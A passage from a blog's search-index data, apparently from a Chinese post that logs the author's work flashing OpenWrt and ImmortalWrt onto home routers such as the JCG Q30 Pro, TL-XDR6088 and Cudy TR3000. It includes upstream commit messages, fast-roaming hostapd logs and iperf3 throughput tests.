JCG Q30 Pro (OpenWrt U-Boot layout)) ImmortalWrt Firmware Selector JCG Q30 Pro (custom U-Boot layout)ImmortalWrt Firmware Selector</p> <p>CMCC RAX3000M\uff1a\u5728\u4e2d\u56fd\u79fb\u52a8 RAX3000M \u4e0a\u4f7f\u7528\u4e3b\u7ebf openwrt \u8bb0\u5f55 - sh1marin's blog</p> <ul> <li>\u60ca\u73b0 cyy</li> <li>\u6709 USB3.0</li> <li>\u5927\u5c0f\u6bd4 jcg \u7565\u5c0f\u70b9\uff0c\u4f46\u662f\u6bd4 jcg \u539a\u4e00\u70b9</li> </ul> <p>H3C NX30 Pro</p> <p>\u5c0f\u7c73 AX3000T\uff1a\u5929\u7ebf\u53ef\u4ee5\u6298\u53e0\uff0c\u5916\u5f62\u6bd4\u8f83\u597d\u770b\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#jcg-q30-pro","title":"JCG Q30 PRO","text":"<ul> <li>\u5206\u539f\u5382 512 MB \u5185\u5b58\u7248\uff0c\u548c 256 MB \u5185\u5b58\u7248</li> <li>\u62c6\u673a\u7248\uff1a\u6377\u7a00 JCG Q30 Pro \u5237\u673a\u8bf4\u660e - \u62c6\u673a\u7248 - Re: MX \u7684\u81ea\u7559\u5730 (kevinmx.top)</li> <li>\u514d\u62c6\u7248\uff1a\u6377\u7a00 JCG Q30 Pro \u5237\u673a\u8bf4\u660e - \u514d\u62c6\u7248 - Re: MX \u7684\u81ea\u7559\u5730 (kevinmx.top)</li> <li>\u5b98\u65b9\uff1a[OpenWrt Wiki] JCG Q30 Pro</li> <li>git.openwrt.org Git - openwrt/openwrt.git/commit</li> </ul> <p>immortalwrt \u652f\u6301</p> <pre><code>**Commit:**\u00a02084a1a31c8faf1adc6b170f3f15fc0660a52ec4  \n**Parents:**\u00a01fabb1e2f5c79ddb8038e9675965cb41054139fc  \n**Author:**\u00a0Tianling Shen &lt;[cnsztl@immortalwrt.org](mailto:cnsztl@immortalwrt.org)&gt;  \n**Author Date:**\u00a0Mon Jun 26 2023 21:00:49 GMT+0800 (China Standard Time)  \n**Committer:**\u00a0Tianling Shen &lt;[cnsztl@immortalwrt.org](mailto:cnsztl@immortalwrt.org)&gt;  \n**Committer Date:**\u00a0Mon Jun 26 2023 21:02:02 GMT+0800 (China Standard Time)  \n\nmediatek: add JCG Q30 (Pro) support  \n\nSigned-off-by: Tianling Shen &lt;cnsztl@immortalwrt.org&gt;\n</code></pre> <p>\u4e3b\u7ebf\u7248\u672c</p> <pre><code>**Commit:**\u00a0626344c9926dcf2db2e10681c19aab0328fee160  \n**Parents:**\u00a0b42c5272286ee248c698cc2cfac88df1bf51cbe3  \n**Author:**\u00a0Chukun Pan &lt;[amadeus@jmu.edu.cn](mailto:amadeus@jmu.edu.cn)&gt;  \n**Author Date:**\u00a0Fri Jun 16 2023 23:16:30 GMT+0800 (China Standard Time)  \n**Committer:**\u00a0Hauke Mehrtens &lt;[hauke@hauke-m.de](mailto:hauke@hauke-m.de)&gt;  \n**Committer Date:**\u00a0Sun Nov 19 2023 23:52:16 GMT+0800 (China Standard Time)  \n\nmediatek: filogic: add JCG Q30 PRO support  \n\nHardware specification:  \n\u00a0\u00a0SoC: MediaTek MT7981B 2x A53  \n\u00a0\u00a0Flash: Winbond 128MB  \n\u00a0\u00a0RAM: DDR3 256MB  \n\u00a0\u00a0Ethernet: 4x 10/100/1000 Mbps  \n\u00a0\u00a0Switch: MediaTek MT7531AE  \n\u00a0\u00a0WiFi: MediaTek MT7976C  \n\u00a0\u00a0Button: Reset  \n\u00a0\u00a0Power: DC 12V 1A  \n\nFlash instructions:  \n\u00a0\u00a01. Connect to your PC via the Gigabit port of the router,  \n\u00a0\u00a0\u00a0\u00a0\u00a0set a static ip on the ethernet interface of your PC.  \n\u00a0\u00a0\u00a0\u00a0\u00a0(ip 192.168.1.254, gateway 192.168.1.1)  \n\u00a0\u00a02. Attach UART, pause at u-boot menu.  \n\u00a0\u00a03. Select \"Upgrade ATF BL2\", then use preloader.bin  \n\u00a0\u00a04. Select \"Upgrade ATF FIP\", then use bl31-uboot.fip  \n\u00a0\u00a05. Download the initramfs image, and type \"reset\",  \n\u00a0\u00a0\u00a0\u00a0\u00a0waiting for tftp recovery to complete.  \n\u00a0\u00a06. After openwrt boots up, perform sysupgrade.  \n\nNote:  \n\u00a0\u00a01. Since NMBM is disabled, we must back up all partitions.  \n\u00a0\u00a02. Although we can upgrade new firmware in the stock firmware,  \n\u00a0\u00a0\u00a0\u00a0\u00a0we need the special fit image signature of MediaTek and  \n\u00a0\u00a0\u00a0\u00a0\u00a0dual boot (hack kernel) to make u-boot boot it. So just  \n\u00a0\u00a0\u00a0\u00a0\u00a0abandon these hacks and flash it via the serial port.  \n\nSigned-off-by: Chukun Pan &lt;amadeus@jmu.edu.cn&gt;\n</code></pre> <p>immortal \u5220\u9664\u4e86 custom layout</p> <pre><code>**Commit:**\u00a08593c213b018e380e465f9967225abc31b5b3e75  \n**Parents:**\u00a0a97a7d457528bdc6b3c325858edadbec7e7b8641  \n**Author:**\u00a0Tianling Shen &lt;[cnsztl@immortalwrt.org](mailto:cnsztl@immortalwrt.org)&gt;  \n**Author Date:**\u00a0Sat Jan 06 2024 14:24:12 GMT+0800 (China Standard Time)  \n**Committer:**\u00a0Tianling Shen &lt;[cnsztl@immortalwrt.org](mailto:cnsztl@immortalwrt.org)&gt;  \n**Committer Date:**\u00a0Thu Jan 11 2024 11:02:29 GMT+0800 (China Standard Time)  \n\nmediatek: remove custom layout for JCG Q30  \n\nSince the mainline implementation has been accepted by upstream,  \nit doesn't make sense to keep these hacks. People are also confused  \nwith these \"custom layouts\".  \n\nSigned-off-by: Tianling Shen &lt;cnsztl@immortalwrt.org&gt;\n</code></pre> <ul> <li>\u4e3b\u7ebf op \u6ca1\u6709\u514d\u62c6\u5237\u673a\u65b9\u6cd5\uff08\u5237\u8fc7\u6e21\u5305\uff09\u5417\uff1f<ul> <li>\u770b\u6765\u786e\u5b9e\u6ca1\u6709\uff0c\u6765\u81ea\u4e3b\u7ebf commit msg\uff1aAlthough we can upgrade new firmware in the stock firmware, we need the special fit image signature of MediaTek and dual boot (hack kernel) to make u-boot boot it. So just abandon these hacks and flash it via the serial port.</li> </ul> </li> <li>\u53ef\u4ee5\u5148\u7528 237 \u8fc7\u6e21\u56fa\u4ef6\u5237\u597d uboot \u540e\uff0c\u76f4\u63a5\u901a\u8fc7 WebUI \u4e0a\u4f20\u4e3b\u7ebf op sysupgrade\u6587\u4ef6\u5417\uff08\u4e3b\u7ebf\u53ea\u6709sysupgrade\u6ca1\u6709factory\uff09</li> <li>\u53ef\u4ee5\u5237\u597d\u4efb\u610f\u4e00\u4e2a openwrt \u7248\u672c\u540e\uff0cssh \u4e0a\u53bb\u540e\uff0c\u901a\u8fc7 mtd \u5237\u5199\u4e3b\u7ebf op \u5417\uff0c\u9700\u8981\u4fee\u6539\u54ea\u4e9b\u4e1c\u897f\uff08\u6211\u4e4b\u524d\u56e0\u4e3a\u64cd\u4f5c\u4e0d\u5f53\u628a\u4e00\u4e2a wr30u \u53d8\u7816\u4e86\uff0c\u5373\u4f7f TTL \u8fdb\u5165\u4e86 uboot\uff0c\u7ed3\u679c\u7f51\u7edc\u4e0d\u901a\uff0c\u6ca1\u6cd5\u901a\u8fc7 tftp \u6062\u590d\uff09</li> <li>immortalwrt \u4e24\u4e2a\u7248\u672c\uff08OpenWrt U-Boot layout \u548c custom U-Boot layout\uff09\u533a\u522b\u662f\u4ec0\u4e48<ul> <li>Tianling \u7248\u672c\u7684\u5f00\u542f\u4e86 nmbm \u529f\u80fd\uff0c\u4e3b\u7ebf\u7684\u6ca1\u6709\u3002flash \u5206\u533a\u4e0d\u4e00\u6837</li> </ul> </li> <li>\u4e3a\u4ec0\u4e48\u5237\u5929\u7075\u7248\u672c uboot \u4e0d\u7528\u4fee\u6539 BL2\uff08\u4e3b\u7ebf op \u9700\u8981\u5347\u7ea7 ATF BL2\u548cFIP\uff09</li> </ul> <p>\u51e0\u4e2a\u4e00\u822c\u6027\u7684\u95ee\u9898</p> <ul> <li>\u4e3b\u7ebf\u7684 uboot \u6ca1\u6709 webui \u7684\u529f\u80fd\u5417</li> <li>\u5f88\u591a\u5237\u673a\u65b9\u6cd5\u91cc\u7684\u5148\u5237 initramfs image\uff0c\u518d sysupgrade \u7684\u76ee\u7684\u662f\u4e3a\u4ec0\u4e48\uff1f\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4fee\u6539 firmware \u5206\u533a</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u9047\u5230\u95ee\u9898_1","title":"\u9047\u5230\u95ee\u9898","text":"<p>5g 160MHz \u65e0\u7ebf\u5f88\u6162\uff0cping \u5927\u5305\u76f4\u63a5\u4e22\u5305\u3002\u91cd\u65b0\u8fde\u63a5 wifi \u5c31\u597d\u4e86</p> <pre><code>$ ping 192.168.1.1 -l 2000\n\n\u6b63\u5728 Ping 192.168.1.1 \u5177\u6709 2000 \u5b57\u8282\u7684\u6570\u636e:\n\u8bf7\u6c42\u8d85\u65f6\u3002\n\u8bf7\u6c42\u8d85\u65f6\u3002\n\u8bf7\u6c42\u8d85\u65f6\u3002\n\u6765\u81ea 192.168.1.1 \u7684\u56de\u590d: \u5b57\u8282=2000 \u65f6\u95f4=3ms TTL=64\n\n192.168.1.1 \u7684 Ping \u7edf\u8ba1\u4fe1\u606f:\n    \u6570\u636e\u5305: \u5df2\u53d1\u9001 = 4\uff0c\u5df2\u63a5\u6536 = 1\uff0c\u4e22\u5931 = 3 (75% \u4e22\u5931)\uff0c\n\u5f80\u8fd4\u884c\u7a0b\u7684\u4f30\u8ba1\u65f6\u95f4(\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d):\n    \u6700\u77ed = 3ms\uff0c\u6700\u957f = 3ms\uff0c\u5e73\u5747 = 3ms\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#tl-xdr6088","title":"TL-XDR6088","text":"<p>https://lwz322.github.io/2023/07/11/Infrastructure.html#:~:text=%E7%AE%97%E6%98%AF%E6%AF%94%E8%BE%83%E5%A5%BD%E7%9A%84-,XDR6088%E5%88%B7OpenWrt,-%E5%8F%AF%E4%BB%A5%E6%9F%A5%E5%88%B0%E7%9A%84</p> <p>TL-XDR6088/6086 \u5237\u5165\u5b98\u65b9 Openwrt/Immortalwrt - \u5ddd\u53f6 :: \u4e0d\u820d\u663c\u591c (typlog.io)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#debug-\u7248\u672c\u5237\u673a","title":"debug \u7248\u672c\u5237\u673a","text":"<p>\u542b\u56fa\u4ef6\u4e0b\u8f7d\u5730\u5740\uff1a\u3010\u65b0\u63d0\u9192\u3011XTR8488 XDR6088/6086 UPNP DHCP \u8df3Ping Docker \u6f2b\u6e38 \u65e0\u7ebf \u5237\u673a \u5b98\u65b9\u4fee\u590d\u56fa\u4ef61.3\u66f4-Tp-link\u65e0\u7ebf\u8def\u7531\u5668\u53ca\u7f51\u7edc\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - \u53ea\u6709\u6b63\u5f0f\u7248\u53ef\u4ee5\u5237\u5230 debug \u7248\u672c\uff0c\u4fee\u590d\u7248\u4e0d\u884c</p> <p>\u3010\u65b0\u63d0\u9192\u30112024\u5e74\u5237XDR6088\u6709\u611f;\u2014\u2014\u88ab\u4f4e\u4f30\u7684\u738b\u8005-Tp-link\u65e0\u7ebf\u8def\u7531\u5668\u53ca\u7f51\u7edc\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b</p> <p>\u8bb0\u5f55\u4fe1\u606f\uff1a \u5f53\u524d\u786c\u4ef6\u7248\u672c\uff1aTL-XDR6088\u6613\u5c55Turbo\u7248 1.0 \u5f53\u524d\u8f6f\u4ef6\u7248\u672c\uff1a1.0.30 Build 240327 Rel.27223</p> <p>\u5237\u673a</p> <p>1.0.30 -&gt; 1.0.28 -&gt; 1.0.29 \u6d4b\u8bd5\u7248(debug \u7248) -&gt; \u4e0a\u4f20 openwrt/immortalwrt sysupgrade.fip</p> <p>\u6062\u590d\u5b98\u65b9\uff1a</p> <p>\u5982\u679c\u6211\u4eec\u5237\u5b8copenwrt\u611f\u89c9\u4e0d\u6ee1\u610f\u8fd8\u53ef\u4ee5\u5237\u56de\u5b98\u65b9\u539f\u5382\u56fa\u4ef6\u3002\u6211\u4eec\u5237\u673a\u5931\u8d25\uff0c\u6216\u8005\u6309\u7740reset\u4e0a\u7535,\u8def\u7531\u5668\u90fd\u4f1a\u81ea\u52a8\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5237\u5165\u4ecetplink\u4e0b\u8f7d\u7684\u5b98\u65b9\u56fa\u4ef6\u4e86\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u63a5\u53e3","title":"\u63a5\u53e3","text":"<p>2.5 2.5  eth1 lan5 lan1 lan2 lan3 lan4</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#cudy-tr3000-v1","title":"cudy tr3000 v1","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237-openwrt_1","title":"\u5237 openwrt","text":"<p>\u5b98\u65b9\u63d0\u4f9b\u4e86\u8fc7\u6e21\u56fa\u4ef6\uff08openwrt \u56fa\u4ef6\uff0c\u7981\u7528\u4e86\u4fee\u6539 fip \u5206\u533a\uff09\uff1aOpenWrt Software Download \u2013 Cudy</p> <p>\u4e0a\u4f20\u8fc7\u6e21\u56fa\u4ef6\u5373\u53ef\u8fdb\u5165\u4e00\u4e2a openwrt \u7cfb\u7edf\uff0c\u901a\u8fc7 openwrt sysupgrade \u5373\u53ef\u66f4\u65b0\u5230\u5176\u4ed6\u7248\u672c openwrt</p> <p>\u6ce8\u610f\u4e8b\u9879</p> <ul> <li>\u5237\u5b98\u65b9\u8fc7\u6e21\u56fa\u4ef6\u518d\u5237 openwrt \u4e0d\u9700\u8981\u4fee\u6539 uboot</li> <li>hanwckf \u7684 uboot \u6ca1\u6709\u652f\u6301\uff0copenwrt firmware selector \u4e5f\u53ea\u6709\u4e00\u4e2a\u5e03\u5c40\u7684\u955c\u50cf\uff08\u5e94\u8be5\u662f\u5c0f\u955c\u50cf 64MB\uff09</li> </ul> <p>openwrt \u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4e32\u53e3\u5237\u673a\u7684\u65b9\u6cd5\uff1a[OpenWrt Wiki] Cudy TR3000 (AX3000 Travel Router) \u539f\u7406\u662f reset \u8fdb\u5165\u6062\u590d\uff0c\u6062\u590d\u5931\u8d25\u540e\u4f1a\u8fdb\u5165 uboot shell\uff0c\u4e8e\u662f\u53ef\u4ee5\u4f7f\u7528 tftp \u6062\u590d initramfs-kernel.bin</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u4ece-openwrt-\u6062\u590d\u4e3a\u5b98\u65b9","title":"\u4ece openwrt \u6062\u590d\u4e3a\u5b98\u65b9","text":"<p>\u5b98\u65b9\u63d0\u4f9b\u4e86\u4ece openwrt \u5237\u56de\u5b98\u65b9\u56fa\u4ef6\u65b9\u6cd5\uff1aHow to Recovery the Cudy Router From OpenWRT Firmware to Cudy Official</p> <ul> <li>\u57fa\u4e8e tftp\uff0c\u9700\u8981\u4e00\u4e2a recover \u56fa\u4ef6\u3002\u548c\u8fc7\u6e21\u56fa\u4ef6\u5728\u4e00\u8d77\uff0c\u5b98\u65b9\u8fd8\u63d0\u4f9b\u4e86 tftp \u8f6f\u4ef6\u548c pdf \u8bf4\u660e\u3002 Cudy Intermediary OpenWRT Firmware - Google \u4e91\u7aef\u786c\u76d8</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#ft","title":"FT","text":"<p>OpenWRT \u8def\u7531\u5668\u5feb\u901f\u6f2b\u6e38\uff08802.11r\uff09\u914d\u7f6e\u6559\u7a0b\u4ee5\u53ca\u6df1\u5ea6\u89e3\u6790_\u8def\u7531\u5668_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</p> <pre><code>Thu Aug 17 11:31:19 2023 kern.warn kernel: [164938.908390] 7981@C13L2,MacTableInsertEntry() 1537: New Sta:2a:85:8f:ff:be:e3\nThu Aug 17 11:31:19 2023 kern.err kernel: [164938.915643] 7981@C14L1,FT_AuthReqHandler() 536: The MDIE is invalid(Peer MDID= 17 17, My MDID = 82 84\nThu Aug 17 11:31:22 2023 kern.notice kernel: [164942.301972] 7981@C08L3,ap_peer_auth_req_at_idle_action() 717: AUTH - MBSS(1), Rcv AUTH seq#1, Alg=2, Status=0 from [wcid=1]2a:85:8f:ff:be:e3\nThu Aug 17 11:31:22 2023 kern.err kernel: [164942.314678] 7981@C14L1,FT_AuthReqHandler() 536: The MDIE is invalid(Peer MDID= 17 17, My MDID = 82 84\nThu Aug 17 11:31:26 2023 kern.notice kernel: [164945.762095] 7981@C08L3,ap_peer_auth_req_at_idle_action() 717: AUTH - MBSS(1), Rcv AUTH seq#1, Alg=2, Status=0 from [wcid=1]2a:85:8f:ff:be:e3\nThu Aug 17 11:31:26 2023 kern.err kernel: [164945.774793] 7981@C14L1,FT_AuthReqHandler() 536: The MDIE is invalid(Peer MDID= 17 17, My MDID = 82 84\nThu Aug 17 11:31:32 2023 kern.warn kernel: [164952.375145] 7981@C01L2,wifi_sys_disconn_act() 1002:  wdev_idx=1\nThu Aug 17 11:31:32 2023 kern.warn kernel: [164952.381500] 7981@C13L2,MacTableDeleteEntry() 1793: Del Sta:2a:85:8f:ff:be:e3\n</code></pre> <p>\u5ba2\u5385 r3g</p> <pre><code>Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-AUTHENTICATE.indication(2a:85:8f:ff:be:e3, OPEN_SYSTEM)\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\nThu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authenticated\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: association OK (aid 1)\nThu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: associated (aid 1)\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-ASSOCIATE.indication(2a:85:8f:ff:be:e3)\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 1 notification\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: start authentication\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.1X: unauthorizing port\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 1/4 msg of 4-Way Handshake\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: received EAPOL-Key frame (2/4 Pairwise)\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 3/4 msg of 4-Way Handshake\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: received EAPOL-Key frame (4/4 Pairwise)\nThu Aug 17 11:30:05 2023 daemon.notice hostapd: wlan1: AP-STA-CONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.1X: authorizing port\nThu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 RADIUS: starting accounting session CDB345D82723F2E1\nThu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: pairwise key handshake completed (RSN)\nThu Aug 17 11:30:05 2023 daemon.notice hostapd: wlan1: EAPOL-4WAY-HS-COMPLETED 2a:85:8f:ff:be:e3\n\nThu Aug 17 11:36:38 2023 daemon.notice hostapd: wlan1: AP-STA-DISCONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 11:36:38 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: disassociated due to inactivity\nThu Aug 17 11:36:38 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DISASSOCIATE.indication(2a:85:8f:ff:be:e3, 4)\nThu Aug 17 11:36:38 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\nThu Aug 17 11:36:39 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: deauthenticated due to inactivity (timer DEAUTH/REMOVE)\nThu Aug 17 11:36:39 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DEAUTHENTICATE.indication(2a:85:8f:ff:be:e3, 2)\nThu Aug 17 11:36:39 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\n</code></pre> <p>op3(ax6s)</p> <pre><code>Thu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authentication OK (FT)\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-AUTHENTICATE.indication(2a:85:8f:ff:be:e3, FT)\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: association OK (aid 1)\nThu Aug 17 11:30:57 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: associated (aid 1)\nThu Aug 17 11:30:57 2023 daemon.notice hostapd: wlan1: AP-STA-CONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-REASSOCIATE.indication(2a:85:8f:ff:be:e3)\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 6 notification\nThu Aug 17 11:30:57 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: FT authentication already completed - do not start 4-way handshake\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5176\u5b83","title":"\u5176\u5b83","text":"<p>\u539f\u5382\u7cfb\u7edf  \u652f\u6301\u7684\u529f\u80fd </p> <p>\u4ece\u54b8\u9c7c\u4e0a\u4e70\u7684\uff0c\u8def\u7531\u5668\u7cfb\u7edf\u91cc\u53ef\u4ee5\u770b\u5230 1 \u6708\u4efd\u7684\u65e5\u5fd7\u3002 </p> <p>uboot \u63a7\u5236\u53f0 </p> <p></p> <p>webui \u5237\u673a\u65f6\u4e32\u53e3\u8f93\u51fa </p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u786c\u4ef6\u6027\u80fd\u6d4b\u8bd5-wg-\u5e26\u5bbd","title":"\u786c\u4ef6\u6027\u80fd\u6d4b\u8bd5 (wg \u5e26\u5bbd)","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#king3399","title":"king3399","text":"<p>\u672a\u52a0\u5bc6</p> <pre><code>root@op1 \u279c  ~ iperf3 -c 114.214.236.90\n\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.10 GBytes   943 Mbits/sec   70             sender\n[  5]   0.00-10.05  sec  1.09 GBytes   936 Mbits/sec                  receiver\n\nroot@op1 \u279c  ~ iperf3 -c king6.yfycloud.top\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.08 GBytes   924 Mbits/sec   29             sender\n[  5]   0.00-10.04  sec  1.07 GBytes   918 Mbits/sec                  receiver\n</code></pre> <p>wg</p> <pre><code>\u279c  ~ iperf3 -c king\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.04 GBytes   893 Mbits/sec  70559             sender\n[  5]   0.00-10.04  sec  1.04 GBytes   887 Mbits/sec                  receiver\n\n\u279c  ~ iperf3 -c king -R\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.04  sec   691 MBytes   577 Mbits/sec    2             sender\n[  5]   0.00-10.00  sec   688 MBytes   577 Mbits/sec                  receiver\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#p2w","title":"p2w","text":"<p>\u672a\u52a0\u5bc6\uff0c\u5c45\u7136\u8dd1\u4e0d\u6ee1\u5343\u5146\uff08\u8fde\u63a5\u4e2d\u95f4\u901a\u8fc7\u4e86\u4e00\u4e2a usb \u5343\u5146\u7f51\u5361\uff09</p> <pre><code>\u279c  ~ iperf3 -c p2w\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec   754 MBytes   633 Mbits/sec  344             sender\n[  5]   0.00-10.00  sec   752 MBytes   630 Mbits/sec                  receiver\n\n\u279c  ~ iperf3 -c p2w -R\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.01  sec   902 MBytes   757 Mbits/sec  738             sender\n[  5]   0.00-10.00  sec   902 MBytes   757 Mbits/sec                  receiver\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#ax6s_1","title":"ax6s","text":"<p>\u672a\u52a0\u5bc6\uff08\u4e2d\u95f4\u662f\u4e00\u4e2a usb \u5343\u5146\u7f51\u5361\uff09</p> <pre><code>(base) yfy@Tianyi \u279c  ~ iperf3 -c 192.168.36.2\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.10 GBytes   942 Mbits/sec    0             sender\n[  5]   0.00-10.01  sec  1.09 GBytes   939 